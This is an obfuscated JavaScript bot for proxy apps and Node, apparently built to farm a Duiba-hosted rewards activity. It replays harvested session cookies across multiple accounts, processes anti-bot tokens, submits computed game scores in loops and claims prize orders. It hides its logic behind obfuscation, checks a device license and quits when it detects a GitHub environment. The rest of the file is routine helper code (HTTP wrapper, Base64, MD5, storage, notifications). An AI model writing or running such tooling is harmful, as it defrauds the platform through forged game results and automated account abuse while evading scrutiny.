_0x29da49=_0x2bc26c*0x5,_0x5e97a2=_0xb79166[_0x3dfce4(0x206)]((_0x372b23,_0x218a51)=>_0x372b23+0x5*(_0x218a51-0x1),_0x29da49);await $[_0x3dfce4(0x2d5)](_0x2bc26c*0x7530),await this['SubmitGame'](_0x1d628d,_0x46ba0b,_0x29da49,_0x5e97a2,_0x2bc26c,_0x58645d),await this[_0x3dfce4(0x247)](_0x1d628d,_0x46ba0b,_0x2bc26c);}await $[_0x3dfce4(0x2d5)](0x2710);}console[_0x3dfce4(0x26c)]('积分参与次数');if(_0x397cbb[_0x3dfce4(0x258)]<=0x0)return;await $[_0x3dfce4(0x2d5)](0xea60);for(let _0x39983e=0x0;_0x39983e<_0x397cbb['remainingLimitTimes']||0x0;_0x39983e++){if(_0x39983e>0x0)await $[_0x3dfce4(0x2d5)](0xea60);let _0x40f2ea=0x3;await this[_0x3dfce4(0x27e)]();let _0x3619ed=await this[_0x3dfce4(0x233)](_0x1d628d),_0x5ef6b8=_0x3619ed[_0x3dfce4(0x1da)],_0x201c7f=_0x3619ed[_0x3dfce4(0x1fa)];if(!_0x5ef6b8||!_0x201c7f)break;let _0xaab16d,_0xcc293d=0x0;const _0x2314be=0xa;do{_0xaab16d=await this[_0x3dfce4(0x26e)](_0x1d628d,_0x5ef6b8,_0x201c7f),await $[_0x3dfce4(0x2d5)](0xfa0),_0xcc293d++;}while(_0xaab16d!==0x2&&_0xcc293d<_0x2314be);if(_0xaab16d!==0x2)continue;let _0x2cf347=[];for(let _0x497514=0x1;_0x497514<=_0x40f2ea;_0x497514++){_0x2cf347[_0x3dfce4(0x2ad)](_0x497514),await this[_0x3dfce4(0x1d9)](_0x1d628d,_0x5ef6b8,_0x497514);let _0x51e35c=_0x497514*0x5,_0x777d33=_0x2cf347[_0x3dfce4(0x206)]((_0x56f42f,_0x3569f5)=>_0x56f42f+0x5*(_0x3569f5-0x1),_0x51e35c);await $['wait'](_0x497514*0x7530),await this[_0x3dfce4(0x274)](_0x1d628d,_0x5ef6b8,_0x51e35c,_0x777d33,_0x497514,_0x58645d),await this[_0x3dfce4(0x247)](_0x1d628d,_0x5ef6b8,_0x497514);}}}catch(_0x1946ba){console[_0x3dfce4(0x26c)](_0x1946ba);}}async[_0x24494b(0x252)](_0x4fce4c){const _0x34b5f2=_0x24494b;let _0x3ae87e=_0x34b5f2(0x1f4)+DUIBAURL+_0x34b5f2(0x1eb)+_0x4fce4c+'&from=login&spm=89420.1.1.1',_0x4f7fac={'headers':{'Host':DUIBAURL,'Accept':_0x34b5f2(0x2a1),'Cookie':'','User-Agent':ua,'Accept-Language':_0x34b5f2(0x2d1),'Accept-Encoding':'gzip,\x20deflate,\x20br','Connection':_0x34b5f2(0x2cf)},'cookieJar':this[_0x34b5f2(0x2c9)]},_0x16fb9a=await got['post'](_0x3ae87e,_0x4f7fac)[_0x34b5f2(0x25e)]();return _0x16fb9a;}async['AjaxElement'](_0x1e5500){const _0x5e12d4=_0x24494b;let _0x3d1967=_0x5e12d4(0x1f4)+DUIBAURL+_0x5e12d4(0x24f)+Date['now']()+'8',_0x5a5db4={'headers':{'Host':DUIBAURL,'Accept':_0x5e12d4(0x2a1),'Cookie':'','User-Agent':ua,'Accept-Language':_0x5e12d4(0x2d1),'Accept-Encoding':_0x5e12d4(0x1d2),'Connection':'keep-alive','Content-Type':_0x5e12d4(0x1f8)},'cookieJar':this[_0x5e12d4(0x2c9)],'body':_0x5e12d4(0x21b)+_0x1e5500+_0x5e12d4(0x24d)},_0x3061cb=await got[_0x5e12d4(0x2bd)](_0x3d1967,_0x5a5db4)['json']();return _0x3061cb;}async[_0x24494b(0x26b)](_0x309b48){const _0x40c977=_0x24494b;let _0xb540b9=_0x40c977(0x1f4)+DUIBAURL+'/customerService/isShow?_='+Date[_0x40c977(0x2ba)](),_0x3c9576={'headers':{'Host':DUIBAURL,'Accept':_0x40c977(0x241),'Cookie':'','User-Agent':ua,'Accept-Language':_0x40c977(0x2d1),'Accept-Encoding':_0x40c977(0x1d2),'Connection':_0x40c977(0x2cf),'Content-Type':_0x40c977(0x1f8)},'cookieJar':this[_0x40c977(0x2c9)],'body':_0x40c977(0x24a)+_0x309b48},_0xaa9b70=await got['post'](_0xb540b9,_0x3c9576)['json']();console[_0x40c977(0x26c)](_0xaa9b70);}async['GetHdtoolConfig'](_0x304d3b){const _0x463008=_0x24494b;let _0x54eb13='https://'+DUIBAURL+_0x463008(0x29a)+Date[_0x463008(0x2ba)](),_0x2cf969={'headers':{'Host':DUIBAURL,'Accept':_0x463008(0x2a1),'Cookie':'','User-Agent':ua,'Accept-Language':_0x463008(0x2d1),'Accept-Encoding':_0x463008(0x1d2),'Connection':_0x463008(0x2cf),'Content-Type':_0x463008(0x1f8)},'cookieJar':this[_0x463008(0x2c9)],'body':'actId='+_0x304d3b+_0x463008(0x245)},_0xc11ece=await got[_0x463008(0x2bd)](_0x54eb13,_0x2cf969)[_0x463008(0x28d)]();return _0xc11ece;}async[_0x24494b(0x1ec)](_0x44f6e9,_0x4f068a){const _0x508cc0=_0x24494b;let _0x233194=_0x508cc0(0x1f4)+DUIBAURL+_0x508cc0(0x1f9),_0x184a5f={'headers':{'Host':DUIBAURL,'Origin':_0x508cc0(0x1f4)+DUIBAURL,'X-Requested-With':_0x508cc0(0x1e5),'Accept':_0x508cc0(0x241),'Cookie':'','User-Agent':ua,'Accept-Language':_0x508cc0(0x1f1),'Accept-Encoding':_0x508cc0(0x1d2),'Connection':_0x508cc0(0x2cf),'Referer':_0x508cc0(0x1f4)+DUIBAURL+_0x508cc0(0x202),'Content-Type':_0x508cc0(0x1f8)},'cookieJar':this[_0x508cc0(0x2c9)],'body':_0x508cc0(0x1fb)+Date[_0x508cc0(0x2ba)]()+_0x508cc0(0x25c)+_0x44f6e9+_0x508cc0(0x1e1)+_0x4f068a},_0x31a0fd=await got[_0x508cc0(0x2bd)](_0x233194,_0x184a5f)['json']();return _0x31a0fd[_0x508cc0(0x2d8)];}async['doJoin'](_0x3004ec,_0x34e345,_0x4ae5e8){const _0x51e201=_0x24494b;let _0x5e9654='https://'+DUIBAURL+_0x51e201(0x1c4)+_0x3004ec+_0x51e201(0x268)+Date['now'](),_0x23d817={'headers':{'Host':DUIBAURL,'Accept':_0x51e201(0x2a1),'Cookie':'','User-Agent':ua,'Accept-Language':'zh-cn','Accept-Encoding':'gzip,\x20deflate,\x20br','Connection':'keep-alive','Content-Type':_0x51e201(0x1f8)},'cookieJar':this['duibaCookieJar'],'body':'actId='+_0x3004ec+_0x51e201(0x2a4)+_0x3004ec+'&activityType=hdtool&consumerId='+_0x34e345+_0x51e201(0x219)+_0x4ae5e8},_0x10b038=await got[_0x51e201(0x2bd)](_0x5e9654,_0x23d817)[_0x51e201(0x28d)]();return console[_0x51e201(0x26c)](_0x10b038),_0x10b038;}async[_0x24494b(0x2d3)](_0x1209d2){const _0x4c0cf0=_0x24494b;let _0x117908=_0x4c0cf0(0x1f4)+DUIBAURL+_0x4c0cf0(0x253)+Date['now'](),_0x291fba={'headers':{'Host':DUIBAURL,'Accept':_0x4c0cf0(0x2a1),'Cookie':'','User-Agent':ua,'Accept-Language':_0x4c0cf0(0x2d1),'Accept-Encoding':'gzip,\x20deflate,\x20br','Connection':_0x4c0cf0(0x2cf),'Content-Type':'application/x-www-form-urlencoded'},'cookieJar':this[_0x4c0cf0(0x2c9)],'body':_0x4c0cf0(0x1e4)+_0x1209d2+_0x4c0cf0(0x24d)},_0x1db0c3=await got[_0x4c0cf0(0x2bd)](_0x117908,_0x291fba)['json']();return console['log'](_0x1db0c3),_0x1db0c3;}async[_0x24494b(0x2b0)](){const _0x27a8fa=_0x24494b;try{let _0x11b911=_0x27a8fa(0x259),_0x4831f8=await this[_0x27a8fa(0x252)](_0x11b911),_0xd5e396=ParseHtml(_0x4831f8),_0x6ebd2d=_0xd5e396['cid'],_0xbf7cfd=_0xd5e396[_0x27a8fa(0x1cf)],_0x11731b=_0xd5e396[_0x27a8fa(0x1ea)];await this[_0x27a8fa(0x1fc)](_0x11b911),await this[_0x27a8fa(0x26b)](0x4),await this[_0x27a8fa(0x2c1)](_0x11b911),await $['wait'](0x3e8);let _0x304875=await this['getTokenNew'](_0x11b911,_0x6ebd2d),_0x39f57a=dealToken2(_0x304875,_0xbf7cfd)||_0x11731b,_0x3226ff=await this[_0x27a8fa(0x231)](_0x11b911,_0x6ebd2d,_0x39f57a);_0x3226ff=_0x3226ff['orderId'];while(!![]){if(!_0x3226ff)break;let _0x68cead=await this[_0x27a8fa(0x2d3)](_0x3226ff);if(_0x68cead[_0x27a8fa(0x209)]!==0x0)break;await $[_0x27a8fa(0x2d5)](0x3e8);}}catch(_0x2de1e4){console['log'](_0x2de1e4);}}}let arrs;!(async()=>{const _0x4e5c63=_0x24494b;if(typeof $request!==_0x4e5c63(0x2da)){}else{initVM(),arrs=abc(global['vm'],acckey,mac,0x53,0x0);if(!arrs)return;arrs=JSON[_0x4e5c63(0x1e8)](arrs),(KWWURL=arrs['u1'],DUIBAURL=arrs['u2']),(p1=arrs['p1'],p2=arrs['p2'],p3=arrs['p3'],d=arrs['d']),ReadAnswerDict();if(!await checkEnv())return;console[_0x4e5c63(0x26c)]('\x0a公告：'+arrs['gg']+'\x0a'),console[_0x4e5c63(0x26c)](_0x4e5c63(0x2ca)+arrs['bb']+'\x0a'),console['log']('当前设备可执行账号限制为'+arrs[_0x4e5c63(0x2b2)]+_0x4e5c63(0x21d)),console['log'](_0x4e5c63(0x1dc)+userList[_0x4e5c63(0x27c)]+_0x4e5c63(0x2ac));if(userList[_0x4e5c63(0x27c)]>arrs[_0x4e5c63(0x2b2)])return;for(let _0xf480c9 of userList){await _0xf480c9['run']();}}})()['catch'](_0x3b73e7=>console[_0x24494b(0x26c)](_0x3b73e7))[_0x24494b(0x293)](()=>{const _0x16fca5=_0x24494b;$[_0x16fca5(0x275)]();});async function GetRewrite(){const _0x2a1128=_0x24494b;if($request[_0x2a1128(0x299)][_0x2a1128(0x286)](_0x2a1128(0x216))>-0x1){let _0x50e4b5=$request[_0x2a1128(0x299)]['split'](_0x2a1128(0x1fe))[0x1];userCookie?userCookie[_0x2a1128(0x286)](_0x50e4b5)==-0x1&&(userCookie=userCookie+'@'+_0x50e4b5,$['setdata'](userCookie,_0x2a1128(0x249)),ckList=userCookie[_0x2a1128(0x294)]('@'),$[_0x2a1128(0x2b7)](jsname+(_0x2a1128(0x2a5)+ckList[_0x2a1128(0x27c)]+'个ck成功:\x20'+_0x50e4b5))):($[_0x2a1128(0x1e9)](_0x50e4b5,'jjyCookie'),$[_0x2a1128(0x2b7)](jsname+(_0x2a1128(0x277)+_0x50e4b5)));}}async function checkEnv(){const _0x1daf79=_0x24494b;if(userCookie){let _0x50814e=envSplitor[0x0];for(let _0x1f4383 of envSplitor){if(userCookie[_0x1daf79(0x286)](_0x1f4383)>-0x1){_0x50814e=_0x1f4383;break;}}for(let _0xa3ae0e of userCookie[_0x1daf79(0x294)](_0x50814e)[_0x1daf79(0x235)](_0x2eb253=>_0x2eb253['trim']())){if(_0xa3ae0e)userList[_0x1daf79(0x2ad)](new UserInfo(_0xa3ae0e));}return userCount=userList[_0x1daf79(0x27c)],console['log']('共找到'+userCount+_0x1daf79(0x2dd)),!![];}else return console[_0x1daf79(0x26c)](_0x1daf79(0x1d0)),![];}

////////////////////////////////////////////////////////////////////
function populateUrlObject(url, body = '') {
    let host = url.replace('//', '/').split('/')[1]
    let urlObject = {
        url: url,
        headers: {
            'Host': host,
            'Connection': 'keep-alive',
        },
        timeout: 5000,
    }
    if (body) {
        urlObject.body = body
        urlObject.headers['Content-Type'] = 'application/json; charset=utf-8'
        //urlObject.headers['Content-Length'] = urlObject.body ? urlObject.body.length : 0
    }
    return urlObject;
}

async function httpRequest(method, url) {
    httpResult = null, httpReq = null, httpResp = null;
    return new Promise((resolve) => {
        $.send(method, url, async (err, req, resp) => {
            try {
                httpReq = req;
                httpResp = resp;
                if (err) {
                    console.log(`${method}请求失败`);
                    console.log(JSON.stringify(err));
                } else {
                    if (resp.body) {
                        if (typeof resp.body == "object") {
                            httpResult = resp.body;
                        } else {
                            try {
                                httpResult = JSON.parse(resp.body);
                            } catch (e) {
                            }
                        }
                    }
                }
            } catch (e) {
                console.log(e);
            } finally {
                resolve();
            }
        });
    });
}

////////////////////////////////////////////////////////////////////
var Base64 = {
    _keyStr: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=", encode: function (e) {
        var t = "";
        var n, r, i, s, o, u, a;
        var f = 0;
        e = Base64._utf8_encode(e);
        while (f < e.length) {
            n = e.charCodeAt(f++);
            r = e.charCodeAt(f++);
            i = e.charCodeAt(f++);
            s = n >> 2;
            o = (n & 3) << 4 | r >> 4;
            u = (r & 15) << 2 | i >> 6;
            a = i & 63;
            if (isNaN(r)) {
                u = a = 64
            } else if (isNaN(i)) {
                a = 64
            }
            t = t + this._keyStr.charAt(s) + this._keyStr.charAt(o) + this._keyStr.charAt(u) + this._keyStr.charAt(a)
        }
        return t
    }, decode: function (e) {
        var t = "";
        var n, r, i;
        var s, o, u, a;
        var f = 0;
        e = e.replace(/[^A-Za-z0-9+/=]/g, "");
        while (f < e.length) {
            s = this._keyStr.indexOf(e.charAt(f++));
            o = this._keyStr.indexOf(e.charAt(f++));
            u = this._keyStr.indexOf(e.charAt(f++));
            a = this._keyStr.indexOf(e.charAt(f++));
            n = s << 2 | o >> 4;
            r = (o & 15) << 4 | u >> 2;
            i = (u & 3) << 6 | a;
            t = t + String.fromCharCode(n);
            if (u != 64) {
                t = t + String.fromCharCode(r)
            }
            if (a != 64) {
                t = t + String.fromCharCode(i)
            }
        }
        t = Base64._utf8_decode(t);
        return t
    }, _utf8_encode: function (e) {
        e = e.replace(/rn/g, "n");
        var t = "";
        for (var n = 0; n < e.length; n++) {
            var r = e.charCodeAt(n);
            if (r < 128) {
                t += String.fromCharCode(r)
            } else if (r > 127 && r < 2048) {
                t += String.fromCharCode(r >> 6 | 192);
                t += String.fromCharCode(r & 63 | 128)
            } else {
                t += String.fromCharCode(r >> 12 | 224);
                t += String.fromCharCode(r >> 6 & 63 | 128);
                t += String.fromCharCode(r & 63 | 128)
            }
        }
        return t
    }, _utf8_decode: function (e) {
        var t = "";
        var n = 0;
        var r = c1 = c2 = 0;
        while (n < e.length) {
            r = e.charCodeAt(n);
            if (r < 128) {
                t += String.fromCharCode(r);
                n++
            } else if (r > 191 && r < 224) {
                c2 = e.charCodeAt(n + 1);
                t += String.fromCharCode((r & 31) << 6 | c2 & 63);
                n += 2
            } else {
                c2 = e.charCodeAt(n + 1);
                c3 = e.charCodeAt(n + 2);
                t += String.fromCharCode((r & 15) << 12 | (c2 & 63) << 6 | c3 & 63);
                n += 3
            }
        }
        return t
    }
}

function MD5Encrypt(a) {
    function b(a, b) {
        return a << b | a >>> 32 - b
    }

    function c(a, b) {
        var c, d, e, f, g;
        return e = 2147483648 & a, f = 2147483648 & b, c = 1073741824 & a, d = 1073741824 & b, g = (1073741823 & a) + (1073741823 & b), c & d ? 2147483648 ^ g ^ e ^ f : c | d ? 1073741824 & g ? 3221225472 ^ g ^ e ^ f : 1073741824 ^ g ^ e ^ f : g ^ e ^ f
    }

    function d(a, b, c) {
        return a & b | ~a & c
    }

    function e(a, b, c) {
        return a & c | b & ~c
    }

    function f(a, b, c) {
        return a ^ b ^ c
    }

    function g(a, b, c) {
        return b ^ (a | ~c)
    }

    function h(a, e, f, g, h, i, j) {
        return a = c(a, c(c(d(e, f, g), h), j)), c(b(a, i), e)
    }

    function i(a, d, f, g, h, i, j) {
        return a = c(a, c(c(e(d, f, g), h), j)), c(b(a, i), d)
    }

    function j(a, d, e, g, h, i, j) {
        return a = c(a, c(c(f(d, e, g), h), j)), c(b(a, i), d)
    }

    function k(a, d, e, f, h, i, j) {
        return a = c(a, c(c(g(d, e, f), h), j)), c(b(a, i), d)
    }

    function l(a) {
        for (var b, c = a.length, d = c + 8, e = (d - d % 64) / 64, f = 16 * (e + 1), g = new Array(f - 1), h = 0, i = 0; c > i;) b = (i - i % 4) / 4, h = i % 4 * 8, g[b] = g[b] | a.charCodeAt(i) << h, i++;
        return b = (i - i % 4) / 4, h = i % 4 * 8, g[b] = g[b] | 128 << h, g[f - 2] = c << 3, g[f - 1] = c >>> 29, g
    }

    function m(a) {
        var b, c, d = "", e = "";
        for (c = 0; 3 >= c; c++) b = a >>> 8 * c & 255, e = "0" + b.toString(16), d += e.substr(e.length - 2, 2);
        return d
    }

    function n(a) {
        a = a.replace(/\r\n/g, "\n");
        for (var b = "", c = 0; c < a.length; c++) {
            var d = a.charCodeAt(c);
            128 > d ? b += String.fromCharCode(d) : d > 127 && 2048 > d ? (b += String.fromCharCode(d >> 6 | 192), b += String.fromCharCode(63 & d | 128)) : (b += String.fromCharCode(d >> 12 | 224), b += String.fromCharCode(d >> 6 & 63 | 128), b += String.fromCharCode(63 & d | 128))
        }
        return b
    }

    var o, p, q, r, s, t, u, v, w, x = [], y = 7, z = 12, A = 17, B = 22, C = 5, D = 9, E = 14, F = 20, G = 4, H = 11,
        I = 16, J = 23, K = 6, L = 10, M = 15, N = 21;
    for (a = n(a), x = l(a), t = 1732584193, u = 4023233417, v = 2562383102, w = 271733878, o = 0; o < x.length; o += 16) p = t, q = u, r = v, s = w, t = h(t, u, v, w, x[o + 0], y, 3614090360), w = h(w, t, u, v, x[o + 1], z, 3905402710), v = h(v, w, t, u, x[o + 2], A, 606105819), u = h(u, v, w, t, x[o + 3], B, 3250441966), t = h(t, u, v, w, x[o + 4], y, 4118548399), w = h(w, t, u, v, x[o + 5], z, 1200080426), v = h(v, w, t, u, x[o + 6], A, 2821735955), u = h(u, v, w, t, x[o + 7], B, 4249261313), t = h(t, u, v, w, x[o + 8], y, 1770035416), w = h(w, t, u, v, x[o + 9], z, 2336552879), v = h(v, w, t, u, x[o + 10], A, 4294925233), u = h(u, v, w, t, x[o + 11], B, 2304563134), t = h(t, u, v, w, x[o + 12], y, 1804603682), w = h(w, t, u, v, x[o + 13], z, 4254626195), v = h(v, w, t, u, x[o + 14], A, 2792965006), u = h(u, v, w, t, x[o + 15], B, 1236535329), t = i(t, u, v, w, x[o + 1], C, 4129170786), w = i(w, t, u, v, x[o + 6], D, 3225465664), v = i(v, w, t, u, x[o + 11], E, 643717713), u = i(u, v, w, t, x[o + 0], F, 3921069994), t = i(t, u, v, w, x[o + 5], C, 3593408605), w = i(w, t, u, v, x[o + 10], D, 38016083), v = i(v, w, t, u, x[o + 15], E, 3634488961), u = i(u, v, w, t, x[o + 4], F, 3889429448), t = i(t, u, v, w, x[o + 9], C, 568446438), w = i(w, t, u, v, x[o + 14], D, 3275163606), v = i(v, w, t, u, x[o + 3], E, 4107603335), u = i(u, v, w, t, x[o + 8], F, 1163531501), t = i(t, u, v, w, x[o + 13], C, 2850285829), w = i(w, t, u, v, x[o + 2], D, 4243563512), v = i(v, w, t, u, x[o + 7], E, 1735328473), u = i(u, v, w, t, x[o + 12], F, 2368359562), t = j(t, u, v, w, x[o + 5], G, 4294588738), w = j(w, t, u, v, x[o + 8], H, 2272392833), v = j(v, w, t, u, x[o + 11], I, 1839030562), u = j(u, v, w, t, x[o + 14], J, 4259657740), t = j(t, u, v, w, x[o + 1], G, 2763975236), w = j(w, t, u, v, x[o + 4], H, 1272893353), v = j(v, w, t, u, x[o + 7], I, 4139469664), u = j(u, v, w, t, x[o + 10], J, 3200236656), t = j(t, u, v, w, x[o + 13], G, 681279174), w = j(w, t, u, v, x[o + 0], H, 3936430074), v = j(v, w, t, u, x[o + 3], I, 3572445317), u = j(u, v, w, t, x[o + 6], J, 76029189), t = j(t, u, v, w, x[o + 9], G, 3654602809), w = j(w, t, u, v, x[o + 12], H, 3873151461), v = j(v, w, t, u, x[o + 15], I, 530742520), u = j(u, v, w, t, x[o + 2], J, 3299628645), t = k(t, u, v, w, x[o + 0], K, 4096336452), w = k(w, t, u, v, x[o + 7], L, 1126891415), v = k(v, w, t, u, x[o + 14], M, 2878612391), u = k(u, v, w, t, x[o + 5], N, 4237533241), t = k(t, u, v, w, x[o + 12], K, 1700485571), w = k(w, t, u, v, x[o + 3], L, 2399980690), v = k(v, w, t, u, x[o + 10], M, 4293915773), u = k(u, v, w, t, x[o + 1], N, 2240044497), t = k(t, u, v, w, x[o + 8], K, 1873313359), w = k(w, t, u, v, x[o + 15], L, 4264355552), v = k(v, w, t, u, x[o + 6], M, 2734768916), u = k(u, v, w, t, x[o + 13], N, 1309151649), t = k(t, u, v, w, x[o + 4], K, 4149444226), w = k(w, t, u, v, x[o + 11], L, 3174756917), v = k(v, w, t, u, x[o + 2], M, 718787259), u = k(u, v, w, t, x[o + 9], N, 3951481745), t = c(t, p), u = c(u, q), v = c(v, r), w = c(w, s);
    var O = m(t) + m(u) + m(v) + m(w);
    return O.toLowerCase()
}

function Env(name, env) {
    "undefined" != typeof process && JSON.stringify(process.env).indexOf("GITHUB") > -1 && process.exit(0);
    return new class {
        constructor(name, env) {
            this.name = name
            this.notifyStr = ''
            this.startTime = (new Date).getTime()
            Object.assign(this, env)
            console.log(`${this.name} 开始运行：\n`)
        }

        isNode() {
            return "undefined" != typeof module && !!module.exports
        }

        isQuanX() {
            return "undefined" != typeof $task
        }

        isSurge() {
            return "undefined" != typeof $httpClient && "undefined" == typeof $loon
        }

        isLoon() {
            return "undefined" != typeof $loon
        }

        getdata(t) {
            let e = this.getval(t);
            if (/^@/.test(t)) {
                const [, s, i] = /^@(.*?)\.(.*?)$/.exec(t),
                    r = s ? this.getval(s) : "";
                if (r)
                    try {
                        const t = JSON.parse(r);
                        e = t ? this.lodash_get(t, i, "") : e
                    } catch (t) {
                        e = ""
                    }
            }
            return e
        }

        setdata(t, e) {
            let s = !1;
            if (/^@/.test(e)) {
                const [, i, r] = /^@(.*?)\.(.*?)$/.exec(e),
                    o = this.getval(i),
                    h = i ? "null" === o ? null : o || "{}" : "{}";
                try {
                    const e = JSON.parse(h);
                    this.lodash_set(e, r, t),
                        s = this.setval(JSON.stringify(e), i)
                } catch (e) {
                    const o = {};
                    this.lodash_set(o, r, t),
                        s = this.setval(JSON.stringify(o), i)
                }
            } else s = this.setval(t, e);
            return s
        }

        getval(t) {
            return this.isSurge() || this.isLoon() ? $persistentStore.read(t) : this.isQuanX() ? $prefs.valueForKey(t) : this.isNode() ? (this.data = this.loaddata(), this.data[t]) : this.data && this.data[t] || null
        }

        setval(t, e) {
            return this.isSurge() || this.isLoon() ? $persistentStore.write(t, e) : this.isQuanX() ? $prefs.setValueForKey(t, e) : this.isNode() ? (this.data = this.loaddata(), this.data[e] = t, this.writedata(), !0) : this.data && this.data[e] || null
        }

        send(m, t, e = (() => {
        })) {
            if (m != 'get' && m != 'post' && m != 'put' && m != 'delete') {
                console.log(`无效的http方法：${m}`);
                return;
            }
            if (m == 'get' && t.headers) {
                delete t.headers["Content-Type"];
                delete t.headers["Content-Length"];
            } else if (t.body && t.headers) {
                if (!t.headers["Content-Type"]) t.headers["Content-Type"] = "application/x-www-form-urlencoded";
            }
            if (this.isSurge() || this.isLoon()) {
                if (this.isSurge() && this.isNeedRewrite) {
                    t.headers = t.headers || {};
                    Object.assign(t.headers, {"X-Surge-Skip-Scripting": !1});
                }
                let conf = {
                    method: m,
                    url: t.url,
                    headers: t.headers,
                    timeout: t.timeout,
                    data: t.body
                };
                if (m == 'get') delete conf.data
                $axios(conf).then(t => {
                    const {
                        status: i,
                        request: q,
                        headers: r,
                        data: o
                    } = t;
                    e(null, q, {
                        statusCode: i,
                        headers: r,
                        body: o
                    });
                }).catch(err => console.log(err))
            } else if (this.isQuanX()) {
                t.method = m.toUpperCase(), this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, {
                    hints: !1
                })),
                    $task.fetch(t).then(t => {
                        const {
                            statusCode: i,
                            request: q,
                            headers: r,
                            body: o
                        } = t;
                        e(null, q, {
                            statusCode: i,
                            headers: r,
                            body: o
                        })
                    }, t => e(t))
            } else if (this.isNode()) {
                this.got = this.got ? this.got : got;
                const {
                    url: s,
                    ...i
                } = t;
                this.instance = this.got.extend({
                    followRedirect: false
                });
                this.instance[m](s, i).then(t => {
                    const {
                        statusCode: i,
                        request: q,
                        headers: r,
                        body: o
                    } = t;
                    e(null, q, {
                        statusCode: i,
                        headers: r,
                        body: o
                    })
                }, t => {
                    const {
                        message: s,
                        response: i
                    } = t;
                    e(s, i, i && i.body)
                })
            }
        }

        time(t) {
            let e = {
                "M+": (new Date).getMonth() + 1,
                "d+": (new Date).getDate(),
                "h+": (new Date).getHours(),
                "m+": (new Date).getMinutes(),
                "s+": (new Date).getSeconds(),
                "q+": Math.floor(((new Date).getMonth() + 3) / 3),
                S: (new Date).getMilliseconds()
            };
            /(y+)/.test(t) && (t = t.replace(RegExp.$1, ((new Date).getFullYear() + "").substr(4 - RegExp.$1.length)));
            for (let s in e)
                new RegExp("(" + s + ")").test(t) && (t = t.replace(RegExp.$1, 1 == RegExp.$1.length ? e[s] : ("00" + e[s]).substr(("" + e[s]).length)));
            return t
        }

        async showmsg() {
            if (!this.notifyStr) return;
            let notifyBody = this.name + " 运行通知\n\n" + this.notifyStr
            if ($.isNode()) {
                //var notify = require('./sendNotify');
                console.log('\n============== 推送 ==============')
                await notify.sendNotify(this.name, notifyBody);
            } else {
                this.msg(notifyBody);
            }
        }

        logAndNotify(str) {
            console.log(str)
            this.notifyStr += str
            this.notifyStr += '\n'
        }

        msg(e = t, s = "", i = "", r) {
            const o = t => {
                if (!t)
                    return t;
                if ("string" == typeof t)
                    return this.isLoon() ? t : this.isQuanX() ? {
                            "open-url": t
                        }
                        : this.isSurge() ? {
                                url: t
                            }
                            : void 0;
                if ("object" == typeof t) {
                    if (this.isLoon()) {
                        let e = t.openUrl || t.url || t["open-url"],
                            s = t.mediaUrl || t["media-url"];
                        return {
                            openUrl: e,
                            mediaUrl: s
                        }
                    }
                    if (this.isQuanX()) {
                        let e = t["open-url"] || t.url || t.openUrl,
                            s = t["media-url"] || t.mediaUrl;
                        return {
                            "open-url": e,
                            "media-url": s
                        }
                    }
                    if (this.isSurge()) {
                        let e = t.url || t.openUrl || t["open-url"];
                        return {
                            url: e
                        }
                    }
                }
            };
            this.isMute || (this.isSurge() || this.isLoon() ? $notification.post(e, s, i, o(r)) : this.isQuanX() && $notify(e, s, i, o(r)));
            let h = ["", "============== 系统通知 =============="];
            h.push(e),
            s && h.push(s),
            i && h.push(i),
                console.log(h.join("\n"))
        }

        getMin(a, b) {
            return ((a < b) ? a : b)
        }

        getMax(a, b) {
            return ((a < b) ? b : a)
        }

        padStr(num, length, padding = '0') {
            let numStr = String(num)
            let numPad = (length > numStr.length) ? (length - numStr.length) : 0
            let retStr = ''
            for (let i = 0; i < numPad; i++) {
                retStr += padding
            }
            retStr += numStr
            return retStr;
        }

        json2str(obj, c, encodeUrl = false) {
            let ret = []
            for (let keys of Object.keys(obj).sort()) {
                let v = obj[keys]
                if (v && encodeUrl) v = encodeURIComponent(v)
                ret.push(keys + '=' + v)
            }
            return ret.join(c);
        }

        str2json(str, decodeUrl = false) {
            let ret = {}
            for (let item of str.split('&')) {
                if (!item) continue;
                let idx = item.indexOf('=')
                if (idx == -1) continue;
                let k = item.substr(0, idx)
                let v = item.substr(idx + 1)
                if (decodeUrl) v = decodeURIComponent(v)
                ret[k] = v
            }
            return ret;
        }

        randomString(len, charset = 'abcdef0123456789') {
            let str = '';
            for (let i = 0; i < len; i++) {
                str += charset.charAt(Math.floor(Math.random() * charset.length));
            }
            return str;
        }

        wait(t) {
            return new Promise(e => setTimeout(e, t))
        }

        done(t = {}) {
            const e = (new Date).getTime(),
                s = (e - this.startTime) / 1e3;
            console.log(`\n${this.name} 运行结束，共运行了 ${s} 秒！`)
            if (this.isSurge() || this.isQuanX() || this.isLoon()) $done(t)
        }
    }(name, env)
}